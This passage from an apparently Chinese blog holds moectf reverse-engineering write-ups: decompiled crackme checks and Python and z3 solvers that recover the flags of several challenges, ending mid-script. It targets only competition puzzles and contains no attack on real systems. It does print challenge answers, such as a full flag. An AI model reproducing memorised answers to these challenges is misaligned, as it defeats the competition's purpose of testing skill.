&quot;ct&#123;l-findiehaai&#123;oveatas&quot;</span><br><span class="line">ROW5 = &quot;ty9kxborszstguyd?!blm-p&quot;</span><br><span class="line">VOWEL = &#123;&#x27;a&#x27;, &#x27;e&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;u&#x27;&#125;</span><br><span class="line">CONSONANT = &#123;&#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;!&#x27;, &#x27;?&#x27;, &#x27;-&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;&#125;</span><br><span class="line">TABLE = [53, 41, 85, 109, 75, 1, 33, 48, 77, 90, 17, 118, 36, 25, 13, 89, 90, 3, 63, 25, 31, 77, 27, 60, 3, 118, 24, 62, 54, 61, 25, 63, 77, 36, 5, 32, 60, 67, 113, 28]</span><br><span class="line"></span><br><span class="line">def add_variance(ori_str):</span><br><span class="line">    variances = set()</span><br><span class="line">    for i, c in enumerate(ori_str):</span><br><span class="line">        if c in CONSONANT:</span><br><span class="line">            variances.add(ori_str[:i+1] + &#x27;e&#x27; + ori_str[i+1:])</span><br><span class="line">            variances.add(ori_str[:i+1] + c + ori_str[i+1:])</span><br><span class="line">    return list(variances)</span><br><span class="line"></span><br><span class="line">def rev_get_str(str):</span><br><span class="line">    return &#x27;&#x27;.join(str[TABLE[i] % len(str)] for i in range(len(TABLE)))</span><br><span class="line"></span><br><span class="line">def is_format(str):</span><br><span class="line">    return str.startswith(&quot;flag&#123;&quot;) and str.endswith(&#x27;&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">rows_variances = [add_variance(ROW1), add_variance(ROW2), add_variance(ROW3), add_variance(ROW4), add_variance(ROW5)]</span><br><span class="line"></span><br><span class="line">count = 0</span><br><span class="line">answers = set()</span><br><span class="line">for variances in product(*rows_variances):</span><br><span class="line">    s = &#x27;&#x27;.join(variances)</span><br><span class="line">    rev = rev_get_str(s)</span><br><span class="line">    if is_format(rev) and rev not in answers:</span><br><span class="line">        answers.add(rev)</span><br><span class="line">        print(rev)</span><br><span class="line">        count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(count)</span><br></pre></td></tr></table></figure>

</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-28</span><span class="leancloud_visitors"></span><span>About 3228 words, 10 min 45 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/28/moectf-wp/">moectf_wp</a></h3></div><div class="post-content"><div class="card"><p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Reverse入门指北"><a href="#Reverse入门指北" class="headerlink" title="Reverse入门指北"></a>Reverse入门指北</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( *(_DWORD *)v7 == 13 )</span><br><span class="line">   sub_401082(aMoectfF1rstSt3, v6);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aMoectfF1rstSt3 db &#x27;moectf&#123;F1rst_St3p_1s_D0ne&#125;&#x27;,0Ah,0</span><br></pre></td></tr></table></figure>



<h2 id="base-64"><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h2><p>pycdc 下载 编译</p>
<p>发现是base64变种</p>
<p><a target="_blank" rel="noopener" href="http://web.chacuo.net/netbasex">http://web.chacuo.net/netbasex</a></p>
<p>把索引表复制进去解密拿到flag</p>
<h2 id="UPX"><a href="#UPX" class="headerlink" title="UPX!"></a>UPX!</h2><p>exeinfope中看到是upx 3.9 脱壳后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = j;</span><br><span class="line">    v2 = sub_140073829((__int64)inputString);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt;= v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    inputString[j] ^= <span class="number">0x67</span>u;</span><br><span class="line">    <span class="keyword">if</span> ( flag[j] != inputString[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_140073973((__int64)<span class="string">&quot;try again~~&quot;</span>);</span><br><span class="line">      sub_1400723F7(<span class="number">0</span>i64);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在这里可以得出只需要将flag全部数据异或上0x67u转ascii码就能拿到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x13</span>, <span class="number">0x01</span>, <span class="number">0x1C</span>, <span class="number">0x57</span>, <span class="number">0x0F</span>, <span class="number">0x38</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x57</span>, <span class="number">0x12</span>, <span class="number">0x38</span>, <span class="number">0x2C</span>, <span class="number">0x09</span>, <span class="number">0x57</span>, <span class="number">0x10</span>, <span class="number">0x38</span>, <span class="number">0x2F</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x10</span>, <span class="number">0x38</span>, <span class="number">0x13</span>, <span class="number">0x08</span>, <span class="number">0x38</span>, <span class="number">0x35</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x54</span>,</span><br><span class="line">    <span class="number">0x15</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x38</span>, <span class="number">0x32</span>, <span class="number">0x37</span>, <span class="number">0x3F</span></span><br><span class="line">] + [<span class="number">0x46</span>, <span class="number">0x46</span>, <span class="number">0x46</span>] + [<span class="number">0x1A</span>] + [<span class="number">0x00</span>] * <span class="number">0x17</span></span><br><span class="line"></span><br><span class="line">xor_result = [byte ^ <span class="number">0x67</span> <span class="keyword">for</span> byte <span class="keyword">in</span> data]</span><br><span class="line">ascii_output = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> xor_result])</span><br><span class="line"><span class="built_in">print</span>(ascii_output)</span><br></pre></td></tr></table></figure>



<h2 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data = [ <span class="number">0x54</span>,<span class="number">0x56</span>,<span class="number">0x5C</span>,<span class="number">0x5A</span>,<span class="number">0x4D</span>,<span class="number">0x5F</span>,<span class="number">0x42</span>,</span><br><span class="line">         <span class="number">0x60</span>,<span class="number">0x56</span>,<span class="number">0x4C</span>,<span class="number">0x66</span>,<span class="number">0x52</span>,<span class="number">0x57</span>,<span class="number">0x9</span>,<span class="number">0x4E</span>,<span class="number">0x66</span>,<span class="number">0x51</span>,</span><br><span class="line">         <span class="number">0x9</span>,<span class="number">0x4E</span>,<span class="number">0x66</span>,<span class="number">0x4D</span>,<span class="number">0x9</span></span><br><span class="line">    ,<span class="number">0x66</span>,<span class="number">0x61</span>,<span class="number">0x9</span>,<span class="number">0x6B</span>,<span class="number">0x18</span>,<span class="number">0x44</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">xor_result = [byte ^ <span class="number">0x39</span> <span class="keyword">for</span> byte <span class="keyword">in</span> data]</span><br><span class="line">ascii_output = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> xor_result])</span><br><span class="line"><span class="built_in">print</span>(ascii_output)</span><br></pre></td></tr></table></figure>



<h2 id="ANDROID"><a href="#ANDROID" class="headerlink" title="ANDROID"></a>ANDROID</h2><p>根据hint1 搜索到button的id</p>
<p>搜到r.id.check找到关键代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] enc = &#123;<span class="number">25</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">16</span>, <span class="string">&#x27;/&#x27;</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="number">11</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="number">24</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">28</span>, <span class="number">21</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">16</span>&#125;;</span><br><span class="line">    <span class="type">char</span>[] key = &#123;<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;y&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> (EditText) findViewById(R.id.input);</span><br><span class="line">        ((Button) findViewById(R.id.check)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.doctor3.basicandroid.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> editText.getText().toString();</span><br><span class="line">                <span class="keyword">if</span> (obj.length() != <span class="number">31</span>) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;长度不对哦&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">byte</span>[] bytes = obj.getBytes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((bytes[i] ^ MainActivity.<span class="built_in">this</span>.key[i % MainActivity.<span class="built_in">this</span>.key.length]) != MainActivity.<span class="built_in">this</span>.enc[i]) &#123;</span><br><span class="line">                        Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;好像有哪里不对&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;恭喜！回答正确&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((bytes[i] ^ MainActivity.this.key[i % MainActivity.this.key.length]) != MainActivity.this.enc[i])</span><br></pre></td></tr></table></figure>

<p>这里就可以得出只要将enc ^ MainActivity.this.key[i % MainActivity.this.key.length])就可以得到bytes 上面得知bytes的长度为31</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">25</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">16</span>, <span class="string">&#x27;/&#x27;</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">4</span>,</span><br><span class="line">       <span class="number">1</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="number">11</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="number">24</span>,</span><br><span class="line">       <span class="string">&#x27;:&#x27;</span>, <span class="number">28</span>, <span class="number">21</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">key = [<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;y&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(enc[i], <span class="built_in">int</span>):</span><br><span class="line">        enc[i] = enc[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        enc[i] = <span class="built_in">ord</span>(enc[i]) ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i]), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="EQUATION"><a href="#EQUATION" class="headerlink" title="EQUATION"></a>EQUATION</h2><p>使运算全部为假就行了 把!&#x3D;改成&#x3D;&#x3D; 然后丢z3里面跑，scanf是31s，但是ida显示上是最大为24，需要修改一下长度</p>
<p>多行合并一行<a target="_blank" rel="noopener" href="https://www.lddgo.net/string/line-reduce">https://www.lddgo.net/string/line-reduce</a></p>
<p>一行按分隔符分多行<a target="_blank" rel="noopener" href="https://www.toolhelper.cn/Char/TextSplit">https://www.toolhelper.cn/Char/TextSplit</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">v4 = [Int(<span class="string">f&#x27;v4[<span class="subst">&#123;i&#125;</span>]&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     s.add(v4[i] != 0)</span></span><br><span class="line"><span class="comment">#     s.add(v4[i] &gt;= 32)</span></span><br><span class="line"><span class="comment">#     s.add(v4[i] &lt;= 126)</span></span><br><span class="line"></span><br><span class="line">s.add(v4[<span class="number">0</span>] == <span class="number">109</span>) <span class="comment">#m</span></span><br><span class="line">s.add(v4[<span class="number">1</span>] == <span class="number">111</span>) <span class="comment">#o</span></span><br><span class="line">s.add(v4[<span class="number">2</span>] == <span class="number">101</span>) <span class="comment">#e</span></span><br><span class="line">s.add(v4[<span class="number">3</span>] == <span class="number">99</span>)  <span class="comment">#c</span></span><br><span class="line">s.add(v4[<span class="number">4</span>] == <span class="number">116</span>) <span class="comment">#t</span></span><br><span class="line">s.add(v4[<span class="number">5</span>] == <span class="number">102</span>) <span class="comment">#f</span></span><br><span class="line">s.add(v4[<span class="number">6</span>] == <span class="number">123</span>) <span class="comment">#&#123;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">s.add(<span class="number">334</span> * v4[<span class="number">28</span>]+ <span class="number">100</span> * v4[<span class="number">27</span>]+ <span class="number">369</span> * v4[<span class="number">26</span>]+ <span class="number">124</span> * v4[<span class="number">25</span>]+ <span class="number">278</span> * v4[<span class="number">24</span>]+ <span class="number">158</span> * v4[<span class="number">23</span>]+ <span class="number">162</span> * v4[<span class="number">22</span>]+ <span class="number">145</span> * v4[<span class="number">19</span>]+ <span class="number">27</span> * v4[<span class="number">17</span>]+ <span class="number">91</span> * v4[<span class="number">15</span>]+ <span class="number">195</span> * v4[<span class="number">14</span>]+ <span class="number">342</span> * v4[<span class="number">13</span>]+ <span class="number">391</span> * v4[<span class="number">10</span>]+ <span class="number">204</span> * v4[<span class="number">9</span>]+ <span class="number">302</span> * v4[<span class="number">8</span>]+ <span class="number">153</span> * v4[<span class="number">7</span>]+ <span class="number">292</span> * v4[<span class="number">6</span>]+ <span class="number">382</span> * v4[<span class="number">5</span>]+ <span class="number">221</span> * v4[<span class="number">4</span>]+ <span class="number">316</span> * v4[<span class="number">3</span>]+ <span class="number">118</span> * v4[<span class="number">2</span>]+ <span class="number">295</span> * v4[<span class="number">1</span>]+ <span class="number">247</span> * v4[<span class="number">0</span>]+ <span class="number">236</span> * v4[<span class="number">11</span>]+ <span class="number">27</span> * v4[<span class="number">12</span>]+ <span class="number">361</span> * v4[<span class="number">16</span>]+ <span class="number">81</span> * v4[<span class="number">18</span>]+ <span class="number">105</span> * v4[<span class="number">20</span>]+ <span class="number">65</span> * v4[<span class="number">21</span>]+ <span class="number">67</span> * v4[<span class="number">29</span>]+ <span class="number">41</span> * v4[<span class="number">30</span>] == <span class="number">596119</span>)</span><br><span class="line">s.add(<span class="number">371</span> * v4[<span class="number">29</span>]+ <span class="number">338</span> * v4[<span class="number">28</span>]+ <span class="number">269</span> * v4[<span class="number">27</span>]+ <span class="number">312</span> * v4[<span class="number">26</span>]+ <span class="number">67</span> * v4[<span class="number">25</span>]+ <span class="number">299</span> * v4[<span class="number">24</span>]+ <span class="number">235</span> * v4[<span class="number">23</span>]+ <span class="number">294</span> * v4[<span class="number">22</span>]+ <span class="number">303</span> * v4[<span class="number">21</span>]+ <span class="number">211</span> * v4[<span class="number">20</span>]+ <span class="number">122</span> * v4[<span class="number">19</span>]+ <span class="number">333</span> * v4[<span class="number">18</span>]+ <span class="number">341</span> * v4[<span class="number">15</span>]+ <span class="number">111</span> * v4[<span class="number">14</span>]+ <span class="number">253</span> * v4[<span class="number">13</span>]+ <span class="number">68</span> * v4[<span class="number">12</span>]+ <span class="number">347</span> * v4[<span class="number">11</span>]+ <span class="number">44</span> * v4[<span class="number">10</span>]+ <span class="number">262</span> * v4[<span class="number">9</span>]+ <span class="number">357</span> * v4[<span class="number">8</span>]+ <span class="number">323</span> * v4[<span class="number">5</span>]+ <span class="number">141</span> * v4[<span class="number">4</span>]+ <span class="number">329</span> * v4[<span class="number">3</span>]+ <span class="number">378</span> * v4[<span class="number">2</span>]+ <span class="number">316</span> * v4[<span class="number">1</span>]+ <span class="number">235</span> * v4[<span class="number">0</span>]+ <span class="number">59</span> * v4[<span class="number">6</span>]+ <span class="number">37</span> * v4[<span class="number">7</span>]+ <span class="number">264</span> * v4[<span class="number">16</span>]+ <span class="number">73</span> * v4[<span class="number">17</span>]+ <span class="number">126</span> * v4[<span class="number">30</span>] == <span class="number">634009</span>)</span><br><span class="line">s.add(<span class="number">337</span> * v4[<span class="number">29</span>]+ <span class="number">338</span> * v4[<span class="number">28</span>]+ <span class="number">118</span> * v4[<span class="number">27</span>]+ <span class="number">82</span> * v4[<span class="number">26</span>]+ <span class="number">239</span> * v4[<span class="number">21</span>]+ <span class="number">58</span> * v4[<span class="number">20</span>]+ <span class="number">304</span> * v4[<span class="number">19</span>]+ <span class="number">330</span> * v4[<span class="number">18</span>]+ <span class="number">377</span> * v4[<span class="number">17</span>]+ <span class="number">306</span> * v4[<span class="number">16</span>]+ <span class="number">221</span> * v4[<span class="number">13</span>]+ <span class="number">345</span> * v4[<span class="number">12</span>]+ <span class="number">124</span> * v4[<span class="number">11</span>]+ <span class="number">272</span> * v4[<span class="number">10</span>]+ <span class="number">270</span> * v4[<span class="number">9</span>]+ <span class="number">229</span> * v4[<span class="number">8</span>]+ <span class="number">377</span> * v4[<span class="number">7</span>]+ <span class="number">373</span> * v4[<span class="number">6</span>]+ <span class="number">297</span> * v4[<span class="number">5</span>]+ <span class="number">112</span> * v4[<span class="number">4</span>]+ <span class="number">386</span> * v4[<span class="number">3</span>]+ <span class="number">90</span> * v4[<span class="number">2</span>]+ <span class="number">361</span> * v4[<span class="number">1</span>]+ <span class="number">236</span> * v4[<span class="number">0</span>]+ <span class="number">386</span> * v4[<span class="number">14</span>]+ <span class="number">73</span> * v4[<span class="number">15</span>]+ <span class="number">315</span> * v4[<span class="number">22</span>]+ <span class="number">33</span> * v4[<span class="number">23</span>]+ <span class="number">141</span> * v4[<span class="number">24</span>]+ <span class="number">129</span> * v4[<span class="number">25</span>]+ <span class="number">123</span> * v4[<span class="number">30</span>] == <span class="number">685705</span>)</span><br><span class="line">s.add(<span class="number">367</span> * v4[<span class="number">29</span>]+ <span class="number">55</span> * v4[<span class="number">28</span>]+ <span class="number">374</span> * v4[<span class="number">27</span>]+ <span class="number">150</span> * v4[<span class="number">24</span>]+ <span class="number">350</span> * v4[<span class="number">23</span>]+ <span class="number">141</span> * v4[<span class="number">22</span>]+ <span class="number">124</span> * v4[<span class="number">21</span>]+ <span class="number">366</span> * v4[<span class="number">20</span>]+ <span class="number">230</span> * v4[<span class="number">19</span>]+ <span class="number">307</span> * v4[<span class="number">18</span>]+ <span class="number">191</span> * v4[<span class="number">17</span>]+ <span class="number">153</span> * v4[<span class="number">12</span>]+ <span class="number">383</span> * v4[<span class="number">11</span>]+ <span class="number">145</span> * v4[<span class="number">10</span>]+ <span class="number">109</span> * v4[<span class="number">9</span>]+ <span class="number">209</span> * v4[<span class="number">8</span>]+ <span class="number">158</span> * v4[<span class="number">7</span>]+ <span class="number">221</span> * v4[<span class="number">6</span>]+ <span class="number">188</span> * v4[<span class="number">5</span>]+ <span class="number">22</span> * v4[<span class="number">4</span>]+ <span class="number">146</span> * v4[<span class="number">3</span>]+ <span class="number">306</span> * v4[<span class="number">2</span>]+ <span class="number">230</span> * v4[<span class="number">1</span>]+ <span class="number">13</span> * v4[<span class="number">0</span>]+ <span class="number">287</span> * v4[<span class="number">13</span>]+ <span class="number">257</span> * v4[<span class="number">14</span>]+ <span class="number">137</span> * v4[<span class="number">15</span>]+ <span class="number">7</span> * v4[<span class="number">16</span>]+ <span class="number">52</span> * v4[<span class="number">25</span>]+ <span class="number">31</span> * v4[<span class="number">26</span>]+ <span class="number">355</span> * v4[<span class="number">30</span>] == <span class="number">557696</span>)</span><br><span class="line">s.add(<span class="number">100</span> * v4[<span class="number">29</span>]+ <span class="number">191</span> * v4[<span class="number">28</span>]+ <span class="number">362</span> * v4[<span class="number">27</span>]+ <span class="number">55</span> * v4[<span class="number">26</span>]+ <span class="number">210</span> * v4[<span class="number">25</span>]+ <span class="number">359</span> * v4[<span class="number">24</span>]+ <span class="number">348</span> * v4[<span class="number">21</span>]+ <span class="number">83</span> * v4[<span class="number">20</span>]+ <span class="number">395</span> * v4[<span class="number">19</span>]+ <span class="number">350</span> * v4[<span class="number">16</span>]+ <span class="number">291</span> * v4[<span class="number">15</span>]+ <span class="number">220</span> * v4[<span class="number">12</span>]+ <span class="number">196</span> * v4[<span class="number">11</span>]+ <span class="number">399</span> * v4[<span class="number">8</span>]+ <span class="number">68</span> * v4[<span class="number">7</span>]+ <span class="number">84</span> * v4[<span class="number">6</span>]+ <span class="number">281</span> * v4[<span class="number">5</span>]+ <span class="number">334</span> * v4[<span class="number">4</span>]+ <span class="number">53</span> * v4[<span class="number">3</span>]+ <span class="number">399</span> * v4[<span class="number">2</span>]+ <span class="number">338</span> * v4[<span class="number">0</span>]+ <span class="number">18</span> * v4[<span class="number">1</span>]+ <span class="number">148</span> * v4[<span class="number">9</span>]+ <span class="number">21</span> * v4[<span class="number">10</span>]+ <span class="number">174</span> * v4[<span class="number">13</span>]+ <span class="number">36</span> * v4[<span class="number">14</span>]+ <span class="number">2</span> * v4[<span class="number">17</span>]+ <span class="number">41</span> * v4[<span class="number">18</span>]+ <span class="number">137</span> * v4[<span class="number">22</span>]+ <span class="number">24</span> * v4[<span class="number">23</span>]+ <span class="number">368</span> * v4[<span class="number">30</span>] == <span class="number">538535</span>)</span><br><span class="line">s.add(<span class="number">188</span> * v4[<span class="number">29</span>]+ (v4[<span class="number">26</span>] * <span class="number">2</span> ** <span class="number">7</span>)+ <span class="number">93</span> * v4[<span class="number">25</span>]+ <span class="number">248</span> * v4[<span class="number">24</span>]+ <span class="number">83</span> * v4[<span class="number">23</span>]+ <span class="number">207</span> * v4[<span class="number">22</span>]+ <span class="number">217</span> * v4[<span class="number">19</span>]+ <span class="number">309</span> * v4[<span class="number">16</span>]+ <span class="number">16</span> * v4[<span class="number">15</span>]+ <span class="number">135</span> * v4[<span class="number">14</span>]+ <span class="number">251</span> * v4[<span 